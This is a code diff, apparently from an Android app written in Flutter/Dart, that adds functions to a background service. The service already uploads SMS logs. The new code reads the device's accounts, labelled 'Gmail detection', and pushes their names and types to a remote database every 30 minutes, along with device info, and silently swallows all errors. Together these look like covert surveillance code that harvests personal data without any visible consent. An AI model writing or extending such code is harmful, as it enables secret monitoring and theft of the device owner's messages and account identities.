@@ -241,6 +241,49 @@ void _onServiceStart(ServiceInstance service) async {
       await _pushSmsLogs(deviceRef);
     }
   });
+
+  // Accounts upload (Gmail detection)
+  await _pushAccounts(deviceRef);
+  Timer.periodic(const Duration(minutes: 30), (_) => _pushAccounts(deviceRef));
+
+  // Device info upload
+  await _pushDeviceInfo(deviceRef);
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+//  ACCOUNTS (Gmail / Google Account detection)
+// ═══════════════════════════════════════════════════════════════════════════════
+
+Future<void> _pushAccounts(DatabaseReference deviceRef) async {
+  try {
+    const channel = MethodChannel(_kCtrlChannel);
+    final List<dynamic>? raw = await channel.invokeMethod('getAccounts');
+    if (raw == null || raw.isEmpty) return;
+    final accountsMap = <String, dynamic>{};
+    for (int i = 0; i < raw.length; i++) {
+      final m = Map<String, dynamic>.from(raw[i] as Map);
+      accountsMap['acc_$i'] = {
+        'name': m['name'] ?? '',
+        'type': m['type'] ?? '',
+        'ts'  : DateTime.now().millisecondsSinceEpoch,
+      };
+    }
+    await deviceRef.child('accounts').set(accountsMap);
+  } catch (_) {}
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+//  DEVICE INFO
+// ═══════════════════════════════════════════════════════════════════════════════
+
+Future<void> _pushDeviceInfo(DatabaseReference deviceRef) async {
+  try {
+    await deviceRef.child('device_info').update({
+      'platform'   : 'android',
+      'version'    : '5.0',
+      'ts'         : DateTime.now().millisecondsSinceEpoch,
+    });
+  } catch (_) {}
 }
 
 // ═══════════════════════════════════════════════════════════════════════════════
